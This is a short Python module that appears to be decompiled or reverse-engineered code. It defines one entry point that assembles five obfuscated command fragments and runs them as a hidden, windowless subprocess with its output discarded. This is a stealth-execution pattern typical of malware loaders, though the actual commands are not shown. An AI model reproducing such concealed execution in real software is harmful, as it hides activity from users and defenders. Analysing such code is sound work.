"""Recovered zero-argument entry ``oq_f1_go``.

Decompiled structure: five ``sec(...)`` command fragments passed to a
hidden ``subprocess.Popen`` with ``shell=False``, three ``DEVNULL`` handles
and ``CREATE_NO_WINDOW``.
"""
from __future__ import annotations

from ..link._fds_jm import sec
from . import _ops


def oq_f1_go() -> None:
    _sy = sec("zp_uq_6n")
    _z = sec("bv_lt_8p")
    _sp = sec("cw_rj_1a")
    _exe = sec("dy_sk_5e")
    _args = sec("ez_um_2w")
    _ops.hidden_popen((_sy, _z, _sp, _exe, _args))

